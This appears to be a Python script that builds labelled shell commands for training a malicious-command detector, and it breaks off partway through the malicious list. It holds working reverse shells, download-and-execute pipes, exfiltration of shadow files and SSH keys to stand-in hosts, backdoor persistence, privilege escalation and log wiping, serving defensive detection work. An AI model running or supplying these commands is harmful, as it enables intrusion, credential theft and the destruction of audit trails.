#!/usr/bin/env python3
"""
Synthesize adversarial training data for the Gatekeeper 3-class model.

Fills three critical gaps in the training distribution:
1. Adversarial benign: sysadmin/DevOps commands the model currently flags as malicious
2. Context-dependent: commands that are ambiguous without session context
3. Realistic malicious: attack commands with natural variation (not just docs)

Output: CSV rows in gatekeeper_3class format (command,label,original_label,mitre_id)
"""

import csv
import hashlib
import itertools
import os
import random
import sys
from pathlib import Path
from typing import List, Tuple

random.seed(42)

# ---------------------------------------------------------------------------
# 1. ADVERSARIAL BENIGN: Real sysadmin / DevOps / SRE commands
#    These are the exact categories that cause false positives today.
# ---------------------------------------------------------------------------

# --- System discovery (id, whoami, hostname, uname, etc.) ---
_SYSINFO_BENIGN = [
    "id", "id -u", "id -g", "id -Gn", "id -un",
    "whoami", "who", "who -b", "who -r", "w", "w -h",
    "hostname", "hostname -f", "hostname -I", "hostname -s",
    "uname", "uname -a", "uname -r", "uname -m", "uname -s",
    "uptime", "uptime -p", "uptime -s",
    "date", "date +%Y-%m-%d", "date -u", "date +%s",
    "cal", "cal -3", "cal 2026",
    "locale", "timedatectl", "timedatectl status",
    "hostnamectl", "hostnamectl status",
    "arch", "nproc", "getconf LONG_BIT",
    "lsb_release -a", "cat /etc/os-release", "cat /etc/lsb-release",
    "cat /etc/redhat-release", "cat /etc/debian_version",
    "cat /proc/version", "cat /proc/cpuinfo", "cat /proc/meminfo",
    "cat /proc/loadavg", "cat /proc/uptime",
    "lscpu", "lsmem", "lspci", "lsusb", "lshw -short",
    "dmidecode -t system", "dmidecode -t bios",
    "sysctl -a | head -20", "sysctl kernel.hostname",
    "printenv", "env", "env | grep PATH", "echo $SHELL",
    "echo $HOME", "echo $USER", "echo $HOSTNAME",
    "getent passwd $USER", "getent group $USER",
    "groups", "groups $USER", "last -5", "last -a",
    "lastlog", "lastlog -u $USER",
    "finger $USER", "pinky",
]

# --- Network inspection (netstat, ss, ip, ifconfig, etc.) ---
_NETWORK_BENIGN = [
    "ifconfig", "ifconfig -a", "ifconfig eth0",
    "ip addr", "ip addr show", "ip addr show eth0",
    "ip link", "ip link show", "ip -s link",
    "ip route", "ip route show", "ip route get 8.8.8.8",
    "ip neigh", "ip neigh show", "ip -6 addr",
    "netstat -tlnp", "netstat -an", "netstat -rn", "netstat -i",
    "netstat -s", "netstat -tunlp", "netstat -anp | grep LISTEN",
    "ss -tuln", "ss -tlnp", "ss -s", "ss -a", "ss -o state established",
    "arp -a", "arp -n",
    "route", "route -n",
    "ping -c 4 8.8.8.8", "ping -c 3 google.com", "ping -c 1 localhost",
    "ping6 -c 2 ::1",
    "traceroute google.com", "traceroute -n 8.8.8.8",
    "tracepath google.com", "mtr --report google.com",
    "dig google.com", "dig +short google.com", "dig MX google.com",
    "dig @8.8.8.8 example.com", "dig -x 8.8.8.8",
    "nslookup google.com", "nslookup -type=mx google.com",
    "host google.com", "host -t AAAA google.com",
    "resolvectl status", "systemd-resolve --status",
    "ethtool eth0", "iwconfig", "nmcli device status",
    "nmcli connection show", "nmcli general status",
    "curl -I https://google.com", "curl -s https://ifconfig.me",
    "curl -sS https://api.github.com | head -5",
    "curl -o /dev/null -w '%{http_code}' https://example.com",
    "wget --spider https://example.com",
    "wget -q -O - https://example.com | head -1",
    "lsof -i :80", "lsof -i :443", "lsof -i :22",
    "lsof -i -P -n | grep LISTEN",
    "fuser 80/tcp", "fuser 443/tcp",
    "nmap localhost", "nmap -sL 192.168.1.0/24",
    "iptables -L -n", "iptables -L -v --line-numbers",
    "ip6tables -L -n",
    "ufw status", "ufw status verbose",
    "firewall-cmd --list-all", "firewall-cmd --state",
    "tc qdisc show", "tc class show dev eth0",
    "bridge link", "brctl show",
]

# --- Log/config reading ---
_LOGCONFIG_BENIGN = [
    "cat /etc/hostname", "cat /etc/hosts", "cat /etc/resolv.conf",
    "cat /etc/fstab", "cat /etc/mtab",
    "cat /etc/nsswitch.conf", "cat /etc/sysctl.conf",
    "cat /etc/security/limits.conf",
    "cat /etc/ssh/sshd_config", "cat /etc/ssh/ssh_config",
    "cat /etc/nginx/nginx.conf", "cat /etc/apache2/apache2.conf",
    "cat /etc/mysql/my.cnf", "cat /etc/postgresql/14/main/postgresql.conf",
    "cat /etc/default/grub", "cat /etc/environment",
    "cat /etc/profile", "cat /etc/bash.bashrc",
    "cat /etc/sudoers.d/README", "cat /etc/logrotate.conf",
    "cat /etc/crontab", "cat /etc/anacrontab",
    "cat ~/.bashrc", "cat ~/.bash_profile", "cat ~/.profile",
    "cat ~/.ssh/config", "cat ~/.gitconfig",
    "head -20 /var/log/syslog", "head -50 /var/log/auth.log",
    "head -100 /var/log/nginx/access.log",
    "tail -f /var/log/syslog", "tail -100 /var/log/messages",
    "tail -f /var/log/nginx/error.log",
    "tail -50 /var/log/auth.log",
    "less /var/log/kern.log",
    "grep ERROR /var/log/syslog", "grep -i fail /var/log/auth.log",
    "grep -c 404 /var/log/nginx/access.log",
    "zcat /var/log/syslog.1.gz | tail -20",
    "journalctl -xe", "journalctl -u nginx",
    "journalctl -u sshd --since today",
    "journalctl -u docker --no-pager -n 50",
    "journalctl --since '1 hour ago'",
    "journalctl -p err -b", "journalctl -f",
    "dmesg | tail -20", "dmesg -T | grep -i error",
    "ausearch -m avc -ts recent",
    "ls -la /etc/cron.d/", "ls -la /etc/cron.daily/",
    "ls -la /var/log/", "ls -la /etc/systemd/system/",
    "ls -la /etc/nginx/sites-enabled/",
    "ls -la /etc/apache2/sites-enabled/",
    "ls -la /etc/init.d/",
]

# --- Process inspection ---
_PROCESS_BENIGN = [
    "ps aux", "ps auxww", "ps -ef", "ps -eo pid,ppid,cmd,%mem,%cpu",
    "ps aux | grep nginx", "ps aux | grep python",
    "ps aux | grep java", "ps aux | grep node",
    "ps aux --sort=-%mem | head -10",
    "ps aux --sort=-%cpu | head -10",
    "top -bn1 | head -20", "top -bn1 -o %MEM | head -15",
    "htop", "atop",
    "pgrep -la nginx", "pgrep -la python", "pgrep -la sshd",
    "pstree", "pstree -p", "pstree -u",
    "kill -0 1234", "kill -HUP 1234",
    "killall -HUP nginx", "pkill -USR1 nginx",
    "nice -n 10 ./build.sh", "renice -n 5 -p 1234",
    "nohup python3 server.py &",
    "strace -p 1234 -e trace=network",
    "strace -c ls /tmp",
    "ltrace ls", "lsof -p 1234",
    "lsof +D /var/log", "lsof -u www-data",
    "/proc/1234/status", "cat /proc/1234/cmdline",
    "cat /proc/1234/maps", "cat /proc/1234/fd",
]

# --- File permission / ownership ops ---
_FILEPERM_BENIGN = [
    "chmod 644 index.html", "chmod 755 deploy.sh",
    "chmod 600 ~/.ssh/id_rsa", "chmod 700 ~/.ssh",
    "chmod -R 755 /var/www/html",
    "chmod u+x script.sh", "chmod g+rw shared/",
    "chown www-data:www-data /var/www/html",
    "chown -R deploy:deploy /opt/app",
    "chown root:root /etc/nginx/nginx.conf",
    "chgrp developers /shared/project",
    "chgrp -R www-data /var/www",
    "setfacl -m u:deploy:rwx /opt/app",
    "getfacl /opt/app",
    "umask", "umask 022",
    "stat /var/log/syslog", "stat -c %U:%G /etc/passwd",
    "namei -l /var/www/html/index.html",
    "ls -la /tmp/", "ls -lah /home/", "ls -la /opt/",
    "ls -la /var/www/", "ls -laR /etc/nginx/",
]

# --- Cron/service management ---
_SERVICE_BENIGN = [
    "crontab -l", "crontab -e", "crontab -l -u www-data",
    "systemctl status nginx", "systemctl status sshd",
    "systemctl status docker", "systemctl status postgresql",
    "systemctl restart nginx", "systemctl reload nginx",
    "systemctl start docker", "systemctl stop apache2",
    "systemctl enable nginx", "systemctl disable cups",
    "systemctl list-units --type=service --state=running",
    "systemctl list-timers", "systemctl daemon-reload",
    "systemctl is-active nginx", "systemctl is-enabled sshd",
    "service nginx status", "service --status-all",
    "update-rc.d nginx defaults",
    "chkconfig --list",
    "at now + 5 minutes", "atq", "atrm 1",
    "loginctl list-sessions", "loginctl show-session 1",
]

# --- Disk / storage ops ---
_DISK_BENIGN = [
    "df -h", "df -hT", "df -i",
    "du -sh /var/log", "du -sh /home/*", "du -sh /tmp",
    "du -ah /var/log | sort -rh | head -10",
    "mount", "mount | grep ext4",
    "findmnt", "findmnt -t ext4",
    "lsblk", "lsblk -f", "lsblk -o NAME,SIZE,TYPE,MOUNTPOINT",
    "blkid", "fdisk -l",
    "pvs", "vgs", "lvs",
    "smartctl -a /dev/sda",
    "iostat -x 1 3", "iotop -bon1",
    "hdparm -I /dev/sda",
    "tune2fs -l /dev/sda1",
    "e2fsck -n /dev/sda1",
    "xfs_info /dev/sda1",
    "ncdu /var/log",
    "quota -u $USER", "repquota -a",
]

# --- Docker / container ops ---
_DOCKER_BENIGN = [
    "docker ps", "docker ps -a", "docker ps --format '{{.Names}}'",
    "docker images", "docker images -a",
    "docker logs my-container", "docker logs -f web",
    "docker logs --tail 100 api",
    "docker inspect web", "docker inspect --format '{{.State.Status}}' web",
    "docker stats --no-stream",
    "docker exec -it web bash", "docker exec web ls /app",
    "docker exec db pg_isready",
    "docker-compose ps", "docker-compose logs -f",
    "docker-compose up -d", "docker-compose down",
    "docker-compose restart web",
    "docker build -t myapp:latest .",
    "docker pull nginx:latest", "docker pull python:3.11-slim",
    "docker stop web", "docker start web", "docker restart web",
    "docker rm old-container", "docker rmi old-image:v1",
    "docker volume ls", "docker volume inspect data",
    "docker network ls", "docker network inspect bridge",
    "docker system df", "docker system prune -f",
    "docker top web",
    "kubectl get pods", "kubectl get pods -A",
    "kubectl get svc", "kubectl get deployments",
    "kubectl describe pod web-abc123",
    "kubectl logs web-abc123", "kubectl logs -f web-abc123",
    "kubectl exec -it web-abc123 -- bash",
    "kubectl apply -f deployment.yaml",
    "kubectl rollout status deployment/web",
    "kubectl rollout restart deployment/web",
    "kubectl scale deployment/web --replicas=3",
    "kubectl top pods", "kubectl top nodes",
    "kubectl get events --sort-by=.metadata.creationTimestamp",
]

# --- Git / dev workflow ---
_GIT_BENIGN = [
    "git status", "git log --oneline -10", "git log --graph --oneline -20",
    "git diff", "git diff HEAD~1", "git diff --staged",
    "git add .", "git add -p",
    "git commit -m 'fix: update config'",
    "git commit --amend --no-edit",
    "git push origin main", "git push origin feature-branch",
    "git pull origin main", "git pull --rebase",
    "git fetch --all", "git fetch origin",
    "git branch -a", "git branch -d old-branch",
    "git checkout -b new-feature", "git checkout main",
    "git switch main", "git switch -c feature/auth",
    "git merge develop", "git rebase main",
    "git stash", "git stash pop", "git stash list",
    "git tag v1.0.0", "git tag -l 'v*'",
    "git remote -v", "git remote show origin",
    "git blame README.md", "git shortlog -sn",
    "git clean -fd", "git gc",
    "git cherry-pick abc1234",
    "git bisect start", "git bisect good v1.0", "git bisect bad HEAD",
]

# --- Package management ---
_PACKAGE_BENIGN = [
    "apt update", "apt-get update", "apt list --installed",
    "apt list --upgradable", "apt-get upgrade -y",
    "apt install -y nginx", "apt install -y curl wget",
    "apt remove nginx", "apt autoremove -y",
    "dpkg -l | grep nginx", "dpkg -L nginx",
    "yum update", "yum install -y httpd", "yum list installed",
    "dnf update", "dnf install -y python3",
    "rpm -qa | grep ssh", "rpm -qi openssh-server",
    "pip install flask", "pip install -r requirements.txt",
    "pip freeze", "pip list", "pip show flask",
    "pip install --upgrade pip", "pip install --upgrade setuptools",
    "pip3 install django gunicorn",
    "npm install", "npm install express", "npm run build",
    "npm audit", "npm outdated", "npm update",
    "yarn install", "yarn add react", "yarn build",
    "conda install numpy", "conda activate myenv",
    "conda env list", "conda list",
    "gem install rails", "gem list",
    "cargo build", "cargo test", "cargo update",
    "go mod tidy", "go build ./...", "go test ./...",
    "brew install wget", "brew update", "brew upgrade",
    "brew list", "brew info nginx",
    "snap install lxd", "snap list",
]

# --- Build / compile / test ---
_BUILD_BENIGN = [
    "make", "make clean", "make install", "make test",
    "make clean && make", "make -j$(nproc)",
    "cmake ..", "cmake --build .",
    "gcc -o main main.c", "gcc -Wall -O2 -o app app.c",
    "g++ -std=c++17 -o app app.cpp",
    "javac Main.java", "java -jar application.jar",
    "mvn clean install", "mvn test", "mvn package",
    "gradle build", "gradle test",
    "python3 -m pytest tests/", "python3 -m pytest -v",
    "python3 -m pytest --cov=src tests/",
    "python3 setup.py install", "python3 setup.py test",
    "python3 -m unittest discover",
    "python3 manage.py migrate",
    "python3 manage.py runserver",
    "python3 manage.py collectstatic --noinput",
    "flask run --host=0.0.0.0",
    "gunicorn app:app --bind 0.0.0.0:8000",
    "uvicorn main:app --reload",
    "node server.js", "node app.js",
    "npx tsc", "npx eslint src/",
    "dotnet build", "dotnet test", "dotnet run",
    "rustc main.rs", "cargo run --release",
]

# --- Backup / transfer ---
_BACKUP_BENIGN = [
    "tar -czf backup.tar.gz /home/user/data",
    "tar -xzf backup.tar.gz -C /tmp/restore",
    "tar -czf /backup/$(date +%Y%m%d).tar.gz /var/www",
    "tar -tvf archive.tar.gz",
    "zip -r backup.zip /var/www/html",
    "unzip archive.zip -d /tmp/output",
    "gzip access.log", "gunzip access.log.gz",
    "bzip2 largefile.log", "xz database.sql",
    "rsync -avz /home/user/ /backup/user/",
    "rsync -avz --delete src/ dest/",
    "rsync -avz -e ssh /data/ user@backup:/data/",
    "scp file.txt user@remote:/home/user/",
    "scp -r project/ user@server:/opt/",
    "scp user@server:/var/log/app.log .",
    "sftp user@server", "sftp -b batchfile user@server",
    "ssh user@192.168.1.10", "ssh -i ~/.ssh/id_rsa user@server",
    "ssh -L 8080:localhost:80 user@server",
    "ssh user@server 'df -h'",
    "cp -a /etc/nginx /backup/nginx_$(date +%Y%m%d)",
    "cp config.yaml config.yaml.bak",
    "dd if=/dev/sda of=/backup/disk.img bs=4M status=progress",
    "dd if=/dev/zero of=/tmp/testfile bs=1M count=100",
    "rclone sync /data remote:backup/",
    "borgbackup create ::archive /home",
    "duplicity /home file:///backup/home",
    "md5sum important_file.tar.gz", "sha256sum important_file.tar.gz",
    "md5sum -c checksums.md5",
]

# --- User/auth management ---
_AUTH_BENIGN = [
    "passwd", "passwd --status",
    "chage -l $USER", "chage -l www-data",
    "useradd -m -s /bin/bash newuser",
    "usermod -aG docker $USER", "usermod -aG sudo newuser",
    "userdel olduser", "groupadd developers",
    "groupmod -n newname oldname", "groupdel testgroup",
    "gpasswd -a user docker",
    "su - postgres", "su - root -c 'apt update'",
    "sudo -l", "sudo -i", "sudo -u www-data bash",
    "sudo visudo", "sudo cat /etc/shadow",
    "sudo cat /var/log/auth.log",
    "sudo systemctl restart nginx",
    "sudo iptables -L -n", "sudo ufw allow 22",
    "sudo ufw allow 80/tcp", "sudo ufw enable",
    "ssh-keygen -t ed25519 -C 'user@host'",
    "ssh-copy-id user@server",
    "ssh-add ~/.ssh/id_rsa", "ssh-agent bash",
    "gpg --list-keys", "gpg --gen-key",
]

# --- Filesystem search ---
_FIND_BENIGN = [
    "find / -name '*.log' -mtime +30 -delete",
    "find /var/log -name '*.gz' -mtime +90",
    "find /tmp -type f -atime +7 -exec rm {} \\;",
    "find . -name '*.py' -type f",
    "find . -name '*.pyc' -delete",
    "find /home -maxdepth 2 -name '.bashrc'",
    "find /etc -name '*.conf' -newer /etc/hostname",
    "find / -xdev -type f -size +100M",
    "find / -perm -4000 -type f 2>/dev/null",
    "find /var/www -user www-data -type f",
    "locate nginx.conf", "updatedb",
    "which python3", "which nginx", "which java",
    "whereis python3", "type ls", "command -v docker",
]

# --- Misc admin one-liners ---
_MISC_BENIGN = [
    "echo 'hello world'",
    "echo $PATH", "echo $JAVA_HOME",
    "printf '%s\\n' 'test'",
    "yes | head -5",
    "seq 1 10", "shuf -i 1-100 -n 5",
    "sleep 5", "watch -n 2 'df -h'",
    "screen -S session1", "screen -ls",
    "tmux new -s work", "tmux ls", "tmux attach -t work",
    "tee output.log", "tee -a output.log",
    "xargs -I{} echo {}", "parallel echo ::: a b c",
    "basename /path/to/file.txt", "dirname /path/to/file.txt",
    "readlink -f /usr/bin/python3",
    "realpath ./relative/path",
    "cut -d: -f1 /etc/passwd",
    "awk '{print $1}' access.log | sort | uniq -c | sort -rn | head -10",
    "sed -i 's/old/new/g' config.txt",
    "sed -n '10,20p' /var/log/syslog",
    "sort access.log | uniq -c | sort -rn",
    "tr '[:upper:]' '[:lower:]' < input.txt",
    "column -t -s, data.csv | head",
    "jq '.' config.json", "jq '.name' package.json",
    "yq '.services' docker-compose.yml",
    "openssl version", "openssl x509 -in cert.pem -text -noout",
    "openssl req -new -x509 -days 365 -nodes -out cert.pem -keyout key.pem",
    "openssl s_client -connect example.com:443 </dev/null",
    "certbot renew --dry-run",
    "fail2ban-client status", "fail2ban-client status sshd",
    "logrotate -d /etc/logrotate.conf",
    "cron -f", "anacron -T",
    "ldd /usr/bin/nginx", "file /usr/bin/python3",
    "strings /usr/bin/ls | head -10",
    "nm /usr/lib/libc.so | head",
    "objdump -d /usr/bin/ls | head -30",
    "hexdump -C /dev/urandom | head -5",
    "od -A x -t x1z -v /dev/urandom | head -5",
    "base64 certificate.pem", "base64 -d encoded.txt",
    "iconv -f UTF-8 -t ASCII input.txt",
    "bc -l <<< '2^10'",
    "expr 5 + 3",
    "test -f /etc/hosts && echo exists",
    "[[ -d /var/log ]] && echo 'dir exists'",
    "true", "false", ":", "exit 0",
    "alias ll='ls -la'", "unalias ll",
    "history | tail -20", "history -c",
    "fc -l -10",
]


# ---------------------------------------------------------------------------
# 2. CONTEXT_DEPENDENT: commands that are genuinely ambiguous
#    These require session/environmental context to classify.
# ---------------------------------------------------------------------------

_CONTEXT_DEPENDENT = [
    # --- Recon that could be admin or attacker ---
    "cat /etc/passwd", "cat /etc/group", "cat /etc/hosts",
    "cat /etc/crontab", "cat /etc/sudoers",
    "cat /etc/shadow",  # needs sudo, suspicious even for admin
    "cat /proc/net/tcp", "cat /proc/net/arp",
    "cat /proc/self/maps", "cat /proc/self/status",
    "cat /proc/self/environ",
    "ls -la /etc/cron.d/", "ls -la /etc/cron.daily/",
    "ls -la /root/", "ls -la /home/",
    "ls -la /tmp/", "ls -la /dev/shm/",
    "find / -perm -4000 -type f 2>/dev/null",
    "find / -perm -2000 -type f 2>/dev/null",
    "find / -writable -type d 2>/dev/null",
    "find / -name '*.pem' 2>/dev/null",
    "find / -name '*.key' 2>/dev/null",
    "find / -name authorized_keys 2>/dev/null",
    "find / -name '*.conf' -exec grep -l password {} \\;",
    "find / -user root -perm -4000 -exec ls -l {} \\;",
    "find /var/log -name '*.log' -exec grep -l 'password' {} \\;",

    # --- Network probing that could be monitoring or recon ---
    "nmap -sT 192.168.1.0/24",
    "nmap -sV 10.0.0.1",
    "nmap -p 22,80,443 target",
    "nmap -O 192.168.1.1",
    "nmap -sn 192.168.1.0/24",
    "masscan -p1-1000 192.168.1.0/24",
    "arp-scan --localnet",
    "netdiscover -r 192.168.1.0/24",
    "nbtscan 192.168.1.0/24",
    "enum4linux 192.168.1.10",

    # --- Credential/config access ---
    "cat ~/.bash_history", "cat ~/.mysql_history",
    "cat ~/.ssh/id_rsa", "cat ~/.ssh/authorized_keys",
    "cat /etc/security/access.conf",
    "strings /dev/mem | grep -i password",
    "grep -r password /etc/", "grep -ri password /var/www/",
    "grep -ri secret /opt/app/", "grep -ri api_key /home/",
    "grep -r 'BEGIN RSA' /home/", "grep -r 'BEGIN PRIVATE' /etc/",
    "env | grep -i pass", "env | grep -i secret",
    "env | grep -i token", "env | grep -i key",
    "printenv | grep -i aws",
    "cat /proc/1/environ",

    # --- Netcat / socat (dual-use) ---
    "nc -zv 10.0.0.1 22", "nc -zv 192.168.1.1 1-1000",
    "nc -lvp 4444", "nc -lvnp 8080",
    "nc 10.0.0.1 80", "nc -w 3 host 9999",
    "ncat --listen --keep-open -p 8080",
    "socat TCP-LISTEN:4444,reuseaddr,fork -",
    "socat TCP:10.0.0.1:80 -",

    # --- Curl/wget dual-use ---
    "curl -s http://10.0.0.1/payload.sh",
    "curl -X POST -d @/etc/passwd http://10.0.0.1:8080/",
    "wget http://10.0.0.1/shell.sh -O /tmp/shell.sh",
    "wget -q http://evil.com/backdoor -O /tmp/bd",

    # --- System modification (admin or persistence) ---
    "echo '* * * * * /tmp/check.sh' | crontab -",
    "crontab -r",
    "echo 'user ALL=(ALL) NOPASSWD:ALL' >> /etc/sudoers",
    "chmod 4755 /usr/local/bin/tool",
    "chmod u+s /usr/bin/find",

    # --- Process manipulation ---
    "kill -9 $(pgrep sshd)", "killall -9 sshd",
    "pkill -f 'monitoring'", "kill -9 1",
    "nohup /tmp/agent &", "nohup ./monitor.sh &",

    # --- Sniffing / capturing ---
    "tcpdump -i eth0", "tcpdump -i eth0 -w capture.pcap",
    "tcpdump -i eth0 port 80",
    "tcpdump -i any -c 100 -nn",
    "tshark -i eth0", "tshark -i eth0 -f 'port 443'",

    # --- Encoding / obfuscation ---
    "echo 'command' | base64", "echo 'dGVzdA==' | base64 -d",
    "echo -n 'test' | xxd", "xxd -r hexfile",
    "python3 -c 'import base64; print(base64.b64decode(\"dGVzdA==\"))'",
    "openssl enc -aes-256-cbc -in file.txt -out file.enc",
    "openssl enc -d -aes-256-cbc -in file.enc -out file.txt",

    # --- Web tools dual-use ---
    "nikto -h http://10.0.0.25:80",
    "dirb http://target.com",
    "gobuster dir -u http://target.com -w wordlist.txt",
    "wfuzz -c -z file,wordlist.txt http://target.com/FUZZ",
    "sqlmap -u 'http://target.com/page?id=1'",
    "hydra -l admin -P passwords.txt ssh://10.0.0.1",
    "medusa -h 10.0.0.1 -u admin -P wordlist.txt -M ssh",

    # --- Disk/memory forensics ---
    "dd if=/dev/sda of=/tmp/disk.img bs=4M",
    "dd if=/dev/mem of=/tmp/mem.dump bs=1M count=100",
    "volatility -f mem.dump imageinfo",
    "strings /dev/sda | grep password",

    # --- Misc dual-use ---
    "ssh -D 1080 user@server",
    "ssh -R 8080:localhost:80 user@server",
    "ssh -N -L 3306:db:3306 user@jump",
    "python3 -m http.server 8000",
    "python3 -m http.server 80",
    "php -S 0.0.0.0:8080",
    "ruby -run -e httpd . -p 8080",
    "screen -dmS hidden /tmp/script.sh",
    "tmux new -d -s session '/tmp/agent.sh'",
    "at -f /tmp/task.sh now + 1 minute",
    "watch -n 1 'cat /proc/net/tcp'",
    "inotifywait -m /etc/ -e modify",
    "auditctl -w /etc/passwd -p wa",
    "strace -e trace=network -p $(pgrep sshd)",
]

# ---------------------------------------------------------------------------
# 3. REALISTIC MALICIOUS: Attack commands with natural variation
#    Not clean docs — messy, realistic attacker syntax.
# ---------------------------------------------------------------------------

_MALICIOUS = [
    # --- Reverse shells ---
    "bash -i >& /dev/tcp/10.0.0.1/4444 0>&1",
    "bash -c 'bash -i >& /dev/tcp/10.10.14.5/9001 0>&1'",
    "/bin/sh -i >& /dev/tcp/192.168.1.100/1337 0>&1",
    "rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.0.0.1 4444 >/tmp/f",
    "rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|sh -i 2>&1|nc 10.10.14.5 9001 >/tmp/f",
    "nc -e /bin/sh 10.0.0.1 4444",
    "nc -e /bin/bash 192.168.1.100 9001",
    "ncat 10.0.0.1 4444 -e /bin/bash",
    "socat exec:'bash -li',pty,stderr,setsid,sigint,sane tcp:10.0.0.1:4444",
    "socat TCP4:10.0.0.1:4444 EXEC:/bin/bash",
    "python3 -c 'import socket,subprocess,os;s=socket.socket();s.connect((\"10.0.0.1\",4444));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);subprocess.call([\"/bin/sh\",\"-i\"])'",
    "python -c 'import os,pty,socket;s=socket.socket();s.connect((\"10.0.0.1\",4444));[os.dup2(s.fileno(),f)for f in(0,1,2)];pty.spawn(\"/bin/bash\")'",
    "perl -e 'use Socket;$i=\"10.0.0.1\";$p=4444;socket(S,PF_INET,SOCK_STREAM,getprotobyname(\"tcp\"));connect(S,sockaddr_in($p,inet_aton($i)));open(STDIN,\">&S\");open(STDOUT,\">&S\");open(STDERR,\">&S\");exec(\"/bin/sh -i\")'",
    "ruby -rsocket -e 'f=TCPSocket.open(\"10.0.0.1\",4444).to_i;exec sprintf(\"/bin/sh -i <&%d >&%d 2>&%d\",f,f,f)'",
    "php -r '$sock=fsockopen(\"10.0.0.1\",4444);exec(\"/bin/sh -i <&3 >&3 2>&3\");'",
    "lua -e 'local s=require(\"socket\");local t=assert(s.tcp());t:connect(\"10.0.0.1\",4444);os.execute(\"/bin/sh -i <&3 >&3 2>&3\")'",
    "mknod /tmp/backpipe p && /bin/sh 0</tmp/backpipe | nc 10.0.0.1 4444 1>/tmp/backpipe",
    "openssl s_client -quiet -connect 10.0.0.1:4444|/bin/bash|openssl s_client -quiet -connect 10.0.0.1:4445",
    "awk 'BEGIN {s = \"/inet/tcp/0/10.0.0.1/4444\"; while(42) { printf \"> \" |& s; s |& getline c; if (c) { while ((c |& getline line) > 0) print line |& s; close(c) } } }'",

    # --- Download & execute ---
    "curl http://10.0.0.1/payload.sh | bash",
    "curl -s http://attacker.com/implant | sh",
    "curl http://10.0.0.1:8080/shell.py | python3",
    "wget http://10.0.0.1/backdoor -O /tmp/bd && chmod +x /tmp/bd && /tmp/bd",
    "wget -q http://attacker.com/miner -O /dev/shm/.hidden && bash /dev/shm/.hidden",
    "curl -sSL http://10.0.0.1/dropper.sh | bash -s --",
    "python3 -c \"import urllib.request; exec(urllib.request.urlopen('http://10.0.0.1/payload.py').read())\"",
    "cd /tmp && curl -O http://10.0.0.1/elf && chmod 755 elf && ./elf",
    "wget http://attacker.com/xmrig -O /dev/shm/.x && nohup /dev/shm/.x &",

    # --- Data exfiltration ---
    "curl -X POST -d @/etc/passwd http://10.0.0.1:8080/exfil",
    "curl -X POST -d @/etc/shadow http://attacker.com/collect",
    "curl --data-binary @/root/.ssh/id_rsa http://10.0.0.1:9090/keys",
    "curl -F 'file=@/etc/shadow' http://10.0.0.1:8080/upload",
    "cat /etc/passwd | nc 10.0.0.1 9999",
    "cat /etc/shadow | nc 10.0.0.1 9999",
    "tar czf - /home/ | nc 10.0.0.1 8888",
    "tar czf - /etc/ssh/ | curl -X POST -d @- http://10.0.0.1:8080/",
    "base64 /etc/shadow | curl -d @- http://10.0.0.1/exfil",
    "xxd /root/.ssh/id_rsa | nc 10.0.0.1 5555",
    "cat /var/lib/mysql/data/*.frm | gzip | nc 10.0.0.1 6666",
    "zip -r /tmp/loot.zip /home/ && curl -F 'f=@/tmp/loot.zip' http://10.0.0.1/",
    "scp /etc/shadow attacker@10.0.0.1:/tmp/",
    "rsync -avz /home/user/.ssh/ attacker@10.0.0.1:/loot/",

    # --- Persistence ---
    "echo '*/5 * * * * curl http://10.0.0.1/beacon | bash' >> /var/spool/cron/root",
    "(crontab -l; echo '*/5 * * * * /tmp/.backdoor') | crontab -",
    "echo '#!/bin/bash\\ncurl http://10.0.0.1/shell|bash' > /etc/cron.daily/update",
    "cp /tmp/backdoor /usr/local/bin/sshd-helper && chmod +x /usr/local/bin/sshd-helper",
    "echo '/tmp/.implant &' >> /etc/rc.local",
    "echo '/tmp/.persist' >> ~/.bashrc",
    "systemctl enable /tmp/malicious.service",
    "ln -sf /tmp/backdoor /etc/cron.d/update",
    "mkdir -p ~/.ssh && echo 'ssh-rsa AAAA... attacker@host' >> ~/.ssh/authorized_keys",
    "echo 'ssh-rsa AAAA... attacker' >> /root/.ssh/authorized_keys",
    "sed -i 's/PermitRootLogin no/PermitRootLogin yes/' /etc/ssh/sshd_config",
    "echo 'PermitRootLogin yes' >> /etc/ssh/sshd_config && systemctl restart sshd",
    "useradd -o -u 0 -g 0 -M -d /root -s /bin/bash backdoor",
    "echo 'backdoor:password123' | chpasswd",
    "usermod -aG sudo backdoor",

    # --- Privilege escalation ---
    "sudo -u root /bin/bash",
    "echo 'root::0:0:root:/root:/bin/bash' >> /etc/passwd",
    "chmod u+s /bin/bash", "chmod 4755 /bin/dash",
    "cp /bin/bash /tmp/.suid_bash && chmod u+s /tmp/.suid_bash",
    "find / -exec /bin/sh \\;",
    "python3 -c 'import os; os.setuid(0); os.system(\"/bin/bash\")'",
    "perl -e 'exec \"/bin/sh\"'",
    "LD_PRELOAD=/tmp/libevil.so /usr/bin/sudo",
    "echo 'user ALL=(ALL) NOPASSWD: ALL' | sudo tee /etc/sudoers.d/pwned",
    "pkexec /bin/bash",
    "/usr/bin/env /bin/sh -p",

    # --- Credential harvesting ---
    "cat /etc/shadow", "cat /etc/master.passwd",
    "cat /etc/security/opasswd",
    "grep -r password /var/www/html/",
    "grep -ri 'db_password\\|db_pass\\|mysql_pwd' /var/www/",
    "find / -name '*.conf' -exec grep -l 'password' {} \\; 2>/dev/null",
    "find / -name '.env' -exec cat {} \\; 2>/dev/null",
    "find / -name 'wp-config.php' -exec cat {} \\; 2>/dev/null",
    "cat /var/www/html/wp-config.php",
    "cat /var/www/html/.env",
    "cat /opt/app/.env",
    "strings /proc/*/environ 2>/dev/null | grep -i pass",
    "cat /proc/self/environ | tr '\\0' '\\n' | grep -i password",
    "mimikatz.exe", "pypykatz lsa minidump lsass.dmp",
    "python3 LaZagne.py all",
    "hashcat -m 1800 shadow.txt wordlist.txt",
    "john shadow.txt --wordlist=/usr/share/wordlists/rockyou.txt",

    # --- Defense evasion ---
    "unset HISTFILE", "export HISTFILE=/dev/null",
    "export HISTSIZE=0", "set +o history",
    "ln -sf /dev/null ~/.bash_history",
    "echo '' > /var/log/auth.log", "echo '' > /var/log/syslog",
    "echo '' > /var/log/wtmp", "echo '' > /var/log/lastlog",
    "shred -zu /var/log/auth.log",
    "rm -rf /var/log/*.log",
    "find /var/log -name '*.log' -exec truncate -s 0 {} \\;",
    "history -c && history -w",
    "cat /dev/null > ~/.bash_history && history -c",
